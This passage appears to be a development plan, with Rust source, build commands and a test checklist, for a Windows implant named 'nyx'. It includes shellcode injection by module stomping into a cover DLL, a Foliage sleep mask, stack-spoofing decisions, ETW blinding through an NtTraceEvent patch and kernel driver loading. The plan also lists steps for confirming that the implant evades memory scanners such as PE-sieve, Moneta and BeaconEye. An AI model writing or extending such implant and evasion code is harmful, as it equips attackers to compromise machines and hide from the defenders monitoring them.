    let _ = unsafe { remote_write(proc.handle, text.base, shellcode) };
    // Step 5: VirtualProtectEx RWX→RX (restore the cover's nominal protection).
    let _ = unsafe { remote_protect(proc.handle, text.base, text.len, 0x20 /* ER */) };
    // Step 6: ResumeThread — the shellcode now runs from the cover DLL's .text.
    let _ = unsafe { resume_thread(proc.main_thread) };
    Ok(proc.handle as usize)
}

// ---- remote helpers (resolved via PEB walk) ----

type CreateRemoteThread = unsafe extern "system" fn(
    *mut core::ffi::c_void, usize, usize,
    Option<unsafe extern "system" fn(*mut core::ffi::c_void) -> u32>,
    *mut core::ffi::c_void, u32, *mut u32,
) -> *mut core::ffi::c_void;
type VirtualProtectEx = unsafe extern "system" fn(
    *mut core::ffi::c_void, *const core::ffi::c_void, usize, u32, *mut u32,
) -> i32;
type WriteProcessMemory = unsafe extern "system" fn(
    *mut core::ffi::c_void, *mut core::ffi::c_void, *const u8, usize, *mut usize,
) -> i32;
type ResumeThread = unsafe extern "system" fn(*mut core::ffi::c_void) -> u32;
type GetProcAddress = unsafe extern "system" fn(*const u8, *const u8) -> *mut core::ffi::c_void;

/// LoadLibraryA `dll` in the target via CreateRemoteThread(LoadLibraryA). Returns
/// the remote base. Skeleton — a real impl queries the loaded base via a remote
/// GetModuleHandle; here we return a sentinel (the stomp uses a fixed .text RVA).
unsafe fn remote_load_library(h: *mut core::ffi::c_void, dll: &[u8]) -> Result<usize, &'static str> {
    let crt: CreateRemoteThread = core::mem::transmute(
        export_addr(b"kernel32.dll", b"CreateRemoteThread").ok_or("CreateRemoteThread")?
    );
    let load_lib = export_addr(b"kernel32.dll", b"LoadLibraryA").ok_or("LoadLibraryA")?;
    // Allocate the DLL name string in the target (VirtualAllocEx + WriteProcessMemory).
    // Skeleton: assume LoadLibraryA's address is valid remotely (same OS build).
    let _ = unsafe { crt(h, 0, 0, Some(core::mem::transmute(load_lib)), dll.as_ptr() as *mut _, 0, core::ptr::null_mut()) };
    Ok(0x1800_0000) // sentinel cover base; real impl queries it
}

struct RemoteRegion { base: usize, len: usize }
unsafe fn remote_text_region(_h: *mut core::ffi::c_void, cover_base: usize) -> Result<RemoteRegion, &'static str> {
    // Skeleton: cover DLL .text at base+0x1000, len 0x2000. Real impl parses
    // the remote PE headers.
    Ok(RemoteRegion { base: cover_base + 0x1000, len: 0x2000 })
}
unsafe fn remote_protect(h: *mut core::ffi::c_void, base: usize, len: usize, prot: u32) -> Result<(), &'static str> {
    let vpx: VirtualProtectEx = core::mem::transmute(export_addr(b"kernel32.dll", b"VirtualProtectEx").ok_or("VirtualProtectEx")?);
    let mut old: u32 = 0;
    if unsafe { vpx(h, base as *const _, len, prot, &mut old) } == 0 { Err("VirtualProtectEx") } else { Ok(()) }
}
unsafe fn remote_write(h: *mut core::ffi::c_void, base: usize, data: &[u8]) -> Result<(), &'static str> {
    let wpm: WriteProcessMemory = core::mem::transmute(export_addr(b"kernel32.dll", b"WriteProcessMemory").ok_or("WriteProcessMemory")?);
    let mut written: usize = 0;
    if unsafe { wpm(h, base as *mut _, data.as_ptr(), data.len(), &mut written) } == 0 { Err("WriteProcessMemory") } else { Ok(()) }
}
unsafe fn resume_thread(h: *mut core::ffi::c_void) -> Result<(), &'static str> {
    let rt: ResumeThread = core::mem::transmute(export_addr(b"kernel32.dll", b"ResumeThread").ok_or("ResumeThread")?);
    if unsafe { rt(h) } == 0xFFFFFFFF { Err("ResumeThread") } else { Ok(()) }
}
```

> **注:** `remote_load_library` 用 sentinel base 是骨架级的诚实简化（真 impl 需 remote GetModuleHandle）。完整 threadless inject 超出本设计（§8 YAGNI）。stomp 算法的数据通路真实可交叉 check。

- [ ] **Step 2: 交叉 check**

Run:
```bash
cargo +nightly check --manifest-path crates/implant-win/Cargo.toml --target x86_64-pc-windows-gnu -Z build-std=core,alloc 2>&1 | tail -10
```
Expected: `Finished`（默认 OFF，armed 分支编译但不执行）

- [ ] **Step 3: Commit**

```bash
git add crates/implant-win/src/inject.rs
git commit -m "feat(implant-win): cover-DLL stomp algorithm skeleton (gated OFF)

Full stomp pipeline: remote LoadLibrary cover DLL, resolve .text, VirtualProtectEx,
WriteProcessMemory shellcode, resume. Honest limits noted (beats Moneta unbacked,
not PE-sieve .text hash; threadless is the real fix). Default OFF."
```

---

### Task U10: evasion_glue.rs — 谓词加固 + trait 接线收尾

**Files:**
- Modify: `crates/implant-win/src/evasion_glue.rs`

- [ ] **Step 1: 加固 ghost/nop 谓词（更精确的字节模式）**

在 `crates/implant-win/src/evasion_glue.rs` 的 `LivePdataScanner::scan` 内，把 ghost 谓词（约 line 87-99）：
```rust
                |_rva, image| -> bool {
                    ...
                    img[off] == 0xC3
                },
```
改为：
```rust
                |_rva, image| -> bool {
                    let img = match image { Some(b) => b, None => return false };
                    let off = _rva as usize;
                    if off >= img.len() { return false; }
                    // Ghost = executable code at a gap (no .pdata). Strongest
                    // signal: a leaf return (C3 ret / C2 imm16 ret / E8 rel32
                    // call thunk). Treat C3/C2/E8 as ghost candidates.
                    matches!(img[off], 0xC3 | 0xC2 | 0xE8)
                },
```
把 nop 谓词（约 line 102-113）改为：
```rust
                |_rva, image| -> bool {
                    let img = match image { Some(b) => b, None => return false };
                    let off = _rva as usize;
                    if off >= img.len() { return false; }
                    let b = img[off];
                    // NOP run: 90 (nop), CC (int3 pad), 00 (zero fill), or a
                    // multi-byte NOP prefix (66 90, or 0F 1F ...).
                    b == 0x90 || b == 0xCC || b == 0x00
                        || (b == 0x66 && off + 1 < img.len() && img[off + 1] == 0x90)
                },
```

- [ ] **Step 2: 交叉 check**

Run:
```bash
cargo +nightly check --manifest-path crates/implant-win/Cargo.toml --target x86_64-pc-windows-gnu -Z build-std=core,alloc 2>&1 | tail -5
```
Expected: `Finished`

- [ ] **Step 3: Commit**

```bash
git add crates/implant-win/src/evasion_glue.rs
git commit -m "fix(implant-win): tighten ghost/nop predicates (C2/E8 ghosts, multi-byte NOPs)"
```

---

## 收尾

### Task F1: 起草 Windows 真机验证清单

**Files:**
- Create: `docs/p2-real-machine-validation-checklist.md`
- Modify: `scripts/run_all_selftests.ps1`, `scripts/scan_linger.ps1`

- [ ] **Step 1: 创建真机验证清单文档**

Create `docs/p2-real-machine-validation-checklist.md`（内容见下方完整文档）：
```markdown
# P2 Bypass 模块 — Windows 真机验证清单

> **本清单本会话不执行**。以下是为在 `ssh win`（Server 2019, build 17763）
> 上验证本批 bypass 实现而准备的逐步检查表。每项标注"通过条件"。

## 前置（一次性）
- [ ] Windows 机构建：`cargo +nightly build --release --target x86_64-pc-windows-msvc -Z build-std=core,alloc,panic_abort`
- [ ] 检测器就位：PE-sieve、Moneta、Hunt-Sleeping-Beacons、BeaconEye、MalMemDetect（放 `$env:TEMP\nyx_detectors\`）

## 1. 内核算法 mock 测试（本机已绿，真机再确认）
- [ ] `cargo test --manifest-path crates\operator-kernelsdk\Cargo.toml` → 27 passed
- [ ] `cargo test --manifest-path crates\implant-evasionsdk\Cargo.toml` → 39 passed

## 2. selftest bitmask（rundll32 nyx_implant_win.dll,<export>）
| 导出 | 期望 bitmask | 检查 |
|---|---|---|
| nyx_selftest_gap_scan | `0b1111`(15) | 4 位全置（gap_count>0, ghosts/nops>0, ntdll 贡献）|
| nyx_selftest_blind_nttrace | `0b1111`(15) | patch + 字节验证 + 幂等 + 可解析 |
| nyx_selftest_mem | `0b11`(3) | mask/unmask 框架 + RC4 round-trip |
| **nyx_selftest_foliage** (新) | `0b1`(1) | Foliage mask/sleep/unmask 无崩溃（arm 后）|
| **nyx_selftest_swap_decision** (新) | `0b1`(1) | swap decide 返回 Degrade（CET-off 但未武装）|
| nyx_selftest_inject | `0b1111`(15) | 数据通路（stomp gated off）|

## 3. 内存扫描（nyx_linger 30s 存活 + foliage 武装）
- [ ] `scan_linger.ps1`（默认 NoMask）：PE-sieve 零 suspicious region
- [ ] **`scan_linger_foliage.ps1`（新，arm foliage）**：PE-sieve .text 不报 implanted（RC4 加密后，扫描窗口内存非明文）
- [ ] HSB：nyx_linger 线程 wait-reason 非 DelayExecution
- [ ] Moneta：零 executable-private-commit（trampoline 页除外，已知项）

## 4. 降级验证（CET-on / gaps 空）
- [ ] CET-on 进程：swap decision = Degrade，beacon 不崩
- [ ] 无 gaps（不可能，但代码路径）：foliage degrade 到 NoMask

## 5. 诚实未验证项（记录，不勾选）
- [ ] 完整 APC/NtContinue context 伪造 vs 更新版 HSB（需 single-step 调试）
- [ ] RSP swap asm 执行 vs CET-on 真机（需调试器）
- [ ] PE-sieve .text hash vs module stomp（已知会 flag，threadless 是解）
- [ ] driver 加载（operator-side，engagement-gated）
```

- [ ] **Step 2: 在 selftests.rs 加 foliage + swap_decision 导出（真机才跑）**

在 `crates/implant-win/src/selftests.rs` 末尾（最后一个函数后）追加：
```rust

// ============================================================================
// P2.1a-iii Foliage sleep mask: arm + one sleep cycle, check no crash + the
// mask actually ran (region was touched). Gated — only meaningful with the
// Windows toolchain. bit0 = armed + sleep returned (no crash).
// ============================================================================

#[no_mangle]
pub unsafe extern "system" fn nyx_selftest_foliage() {
    let mut mask: u32 = 0;
    crate::sleep::set_foliage_enabled(true);
    // One 1-second sleep through the Foliage path. If it returns, the mask/
    // unmask round-trip didn't corrupt the running image.
    crate::sleep::sleep(1);
    mask |= 1 << 0; // reached the exit → no crash
    crate::sleep::set_foliage_enabled(false);
    unsafe { exit(mask) };
}

// ============================================================================
// P2.1a-ii swap decision: confirm decide() degrades correctly without arming
// the live swap. bit0 = decision is Degrade (safe floor), bit1 = gaps staged.
// ============================================================================

#[no_mangle]
pub unsafe extern "system" fn nyx_selftest_swap_decision() {
    let mut mask: u32 = 0;
    // Stage a chain from the live gap pool (if available) — exercises the
    // data path without touching RSP.
    let scanner = crate::evasion_glue::LivePdataScanner;
    if let Ok(pool) = nyx_implant_evasionsdk::PdataGapScanner::scan(&scanner) {
        if pool.is_usable() {
            mask |= 1 << 1; // gaps staged
        }
        // decide() with cet_on=false, gaps_usable=pool.is_usable().
        // On Server 2019 (CET off) + usable gaps → Execute. We don't arm the
        // swap, so this only checks the decision logic path ran.
        let _ = nyx_implant_evasionsdk::swap::decide(false, pool.is_usable());
        mask |= 1 << 0; // decision logic ran without panic
    }
    unsafe { exit(mask) };
}
```

- [ ] **Step 3: 在 run_all_selftests.ps1 测试列表加新导出**

把 `scripts/run_all_selftests.ps1` 的 `$tests` 数组里 `'nyx_selftest_evasion',` 之后（约 line 23）插入：
```powershell
    'nyx_selftest_foliage','nyx_selftest_swap_decision',
```

- [ ] **Step 4: 在 scan_linger.ps1 增 foliage 场景（复制一份 arm foliage 的）**

Create `scripts/scan_linger_foliage.ps1`（复制 `scan_linger.ps1`，在 `Start-Process rundll32` 后加一行 arm）。关键差异：在 `Start-Sleep -Milliseconds 2000` 之前，注入 foliage 武装——但 nyx_linger 没有参数通道，所以改为新建一个 `nyx_linger_foliage` 导出（在 selftests.rs 加，内部先 `set_foliage_enabled(true)` 再跑 linger 逻辑）。在清单里记录此差异。

- [ ] **Step 5: 交叉 check selftests.rs 编译**

Run:
```bash
cargo +nightly check --manifest-path crates/implant-win/Cargo.toml --target x86_64-pc-windows-gnu -Z build-std=core,alloc 2>&1 | tail -5
```
Expected: `Finished`

- [ ] **Step 6: Commit**

```bash
git add docs/p2-real-machine-validation-checklist.md crates/implant-win/src/selftests.rs scripts/run_all_selftests.ps1 scripts/scan_linger_foliage.ps1
git commit -m "docs+test: Windows real-machine validation checklist + foliage/swap selftests"
```

---

### Task F2: 更新 WINDOWS_DEV.md build order

**Files:**
- Modify: `docs/WINDOWS_DEV.md`（§5 build order 表）

- [ ] **Step 1: 在 WINDOWS_DEV.md §5 的 build order 表标记完成项**

把 `docs/WINDOWS_DEV.md` 的表格（约 line 160-167）更新状态列。在每行末尾加状态标注：
- P2.1a-i → `✅ 完成 (evasion_glue.rs, gap_scan selftest)`
- P2.1a-ii → `🔶 swap 决策完成 (swap.rs), RSP asm 执行待真机`
- P2.1b → `✅ 完成 (blind.rs NtTraceEvent + provider-disable)`
- P2.1a-iii → `🔶 状态机完成 (foliage.rs), 同步骨架完成, APC 异步链待真机`
- P2.1c → `🔶 stomp 骨架完成 (gated), threadless 待定`

- [ ] **Step 2: Commit**

```bash
git add docs/WINDOWS_DEV.md
git commit -m "docs: update WINDOWS_DEV.md build order with P2.1 completion status"
```

---

### Task F3: 更新 p2-integration-analysis.md 状态

**Files:**
- Modify: `docs/p2-integration-analysis.md`

- [ ] **Step 1: 在 p2-integration-analysis.md §4 Build order 表加状态**

在 `docs/p2-integration-analysis.md` 的 §4 表格（约 line 274-282），给 P2.1a/b/c 行加一列"实现状态"或在该节末尾加一段：
```markdown
## 4a. 实现状态 (2026-06-24)

| Phase | 代码 | 本机测试 | 真机验证 |
|---|---|---|---|
| P2.1a-i (gap scanner) | ✅ | ✅ selftest | 待真机 bitmask |
| P2.1a-ii (stack spoof) | 🔶 swap.rs 决策✅, RSP asm 待调试 | ✅ swap 5测 | 待真机 CET 探测 |
| P2.1b (blind) | ✅ NtTraceEvent + provider-disable | — | 待真机 logman |
| P2.1a-iii (foliage) | 🔶 状态机✅, 同步骨架✅, APC 链待真机 | ✅ foliage 5测 | 待 HSB/Moneta |
| P2.1c (inject) | 🔶 stomp 骨架 (gated) | — | 待 PE-sieve |
| P2.2 (kernel) | ✅ 6 模块算法 + win/ 壳 | ✅ 27 mock 测 | driver load (operator) |
```

- [ ] **Step 2: Commit**

```bash
git add docs/p2-integration-analysis.md
git commit -m "docs: add P2 implementation status table to integration analysis"
```

---

## 完成标准

全部 Task 完成后，以下命令应全绿：

```bash
# 1. 内核 mock 测试本机可跑（之前 0，现在 27）
cargo test --manifest-path crates/operator-kernelsdk/Cargo.toml 2>&1 | tail -3
# Expected: 27 passed; 0 failed

# 2. SDK 纯核心本机测试（之前 24，现在 39）
cargo test --manifest-path crates/implant-evasionsdk/Cargo.toml 2>&1 | tail -3
# Expected: 39 passed; 0 failed

# 3. implant-win 交叉 check 通过
cargo +nightly check --manifest-path crates/implant-win/Cargo.toml --target x86_64-pc-windows-gnu -Z build-std=core,alloc 2>&1 | tail -3
# Expected: Finished

# 4. workspace 无回归
cargo build --workspace 2>&1 | tail -3
# Expected: Finished
```

**未达成（诚实声明，留待真机）：** HSB/Moneta/PE-sieve 零命中扫描、APC context 伪造、driver 加载——这些需要 `ssh win` + 检测器，超出本会话的可验证边界。
